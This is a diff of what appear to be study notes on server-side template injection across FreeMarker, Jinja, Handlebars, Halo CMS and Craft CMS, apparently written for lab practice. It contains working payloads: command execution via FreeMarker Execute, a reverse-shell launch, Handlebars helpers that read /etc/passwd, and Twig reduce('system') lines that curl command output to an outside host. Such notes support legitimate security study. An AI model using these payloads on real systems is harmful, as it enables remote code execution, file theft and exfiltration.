@@ -274,6 +274,16 @@ ${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}
 
 ```
 
+1
+(Apache, 2021), https://freemarker.apache.org/docs/app_faq.html ↩︎
+
+2
+(Apache, 2021), https://freemarker.apache.org/docs/api/index.html ↩︎
+
+3
+(Apache, 2021), https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html ↩︎
+
+
 ##### PUG
 
 Javascript template engine
@@ -400,3 +410,181 @@ Sol:
 
 1
 (Nodejs, 2021), https://nodejs.org/docs/latest/api/child_process.html#child_process_child_process_spawnsync_command_args_options ↩︎
+
+##### Jinja - Discovery
+
+Jinja1 is a popular templating engine for Python.
+
+Jinja template engine:
+
+```
+01	<h1>Hey {{ name }}</h1>
+02	{% if reasons %}
+03	Here are a couple of reasons why you are great:
+04	<ul>
+05	{% for r in reasons %}
+06		<li>{{r}}</li>
+07	{% endfor %}
+08	</ul>
+09	{% endif %}
+
+```
+
+{{5*'5'}} -> 55555
+
+Flask sets six global variables: config, request, session, g, url_for(), and get_flashed_messages(). 
+
+{{request}}
+
+###### Jinja - Exploitation
+
+{{config|pprint}}
+
+
+
+
+##### Mustache and Handlebars - Discovery
+
+The Mustache1 templating engine is supported by multiple languages and frameworks.It can render templates on the server- or client-side using JavaScript.it is considered "logic-less". Mustache only supports simple if statements to check whether variables exist or to loop through an array. Mustache injections might only lead to sensitive information disclosure if we know which variables to display, or XSS.
+
+The most popular Handlebars library is for JavaScript,2 which allows for client and server-side rendering; however, there are also Handlebars libraries for Java,3 .NET,4 PHP,5 and more. In this section, we'll focus on handlebars.js.
+
+
+Handlebars template:
+
+```
+01  <h1>Hello {{name}}</h1>
+02  {{#if nicknames}}
+03  Also known as:
+04    {{#each nicknames}}
+05        {{this}}
+06    {{/each}}
+07  {{/if}}
+08
+09  We are using handlebars locally in your browser to generate this template
+
+```
+Expression:
+
+```
+ <h1>Hello {{name}}</h1>
+ 
+```
+ Handlebars Helpers:
+ 
+ ```
+ 02  {{#if nicknames}}
+03  Also known as:
+04    {{#each nicknames}}
+05        {{this}}
+06    {{/each}}
+07  {{/if}}
+
+ ```
+ 
+1
+(Mustache , 2019), https://mustache.github.io/ ↩︎
+
+2
+(handlebars-lang, 2021), https://github.com/handlebars-lang/handlebars.js ↩︎
+
+3
+(jknack, 2020), https://github.com/jknack/handlebars.java ↩︎
+
+4
+(Handlebars-Net, 2021), https://github.com/Handlebars-Net/Handlebars.Net ↩︎
+
+5
+(XaminProject, 2016), https://github.com/XaminProject/handlebars.php ↩︎
+
+
+###### Mustache and Handlebars - Exploitation
+
+One example is a repository named handlebars-helpers.
+
+The read3 helper is used to "read a file from the file system." The readdir4 helper will "return an array of files from the given directory." If an application uses the Handlebars templating engine and uses handlebars-helpers, we may be able to steal sensitive files from the file system.
+
+```
+{{#each (readdir "/etc")}}
+  {{this}}
+{{/each}}
+
+```
+
+```
+{{read "/etc/passwd"}}
+
+```
+
+
+1
+(NPM, 2018), https://www.npmjs.com/advisories/755 ↩︎
+
+2
+(helpers, 2017), https://github.com/helpers/handlebars-helpers ↩︎
+
+3
+(helpers, 2017), https://github.com/helpers/handlebars-helpers ↩︎
+
+4
+(helpers, 2017), https://github.com/helpers/handlebars-helpers#readdir ↩︎
+
+
+##### Halo CMS
+
+Halo CMS reverse shell:
+
+Happened in multiple step using theme editor. Created a elf executable. transferred using curl. then made in executable and then ran it.
+
+```
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("/tmp/shell.elf") }
+
+```
+##### Craft CMS
+
+Twig
+
+```
+gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://craft/
+```
+###### Blind injection
+
+```
+{{[0]|reduce('system','curl http://192.168.49.51/helloFromTheOtherSide')}}
+
+```
+
+
+```
+{{[0]|reduce('system','curl http://192.168.49.51/?exfil=' ~ exfil)}}
+
+{% set exfil = "Hello & Goodbye"| url_encode %}
+{{[0]|reduce('system','curl http://192.168.49.51/?exfil=' ~ exfil)}}
+
+```
+Exfil whoami output:
+
+```
+{% set output %}
+{{[0]|reduce('system','whoami')}}
+{% endset %}
+
+{% set exfil = output| url_encode %}
+{{[0]|reduce('system','curl http://192.168.49.51/?exfil=' ~ exfil)}}
+
+```
+
+
+
+1
+(Symfony, 2021), https://twig.symfony.com/doc/3.x/templates.html#expressions ↩︎
+
+2
+(Symfony, 2021), https://twig.symfony.com/doc/3.x/filters/url_encode.html ↩︎
+
+3
+(Symfony, 2021), https://twig.symfony.com/doc/3.x/tags/set.html ↩︎
+
+
+
+
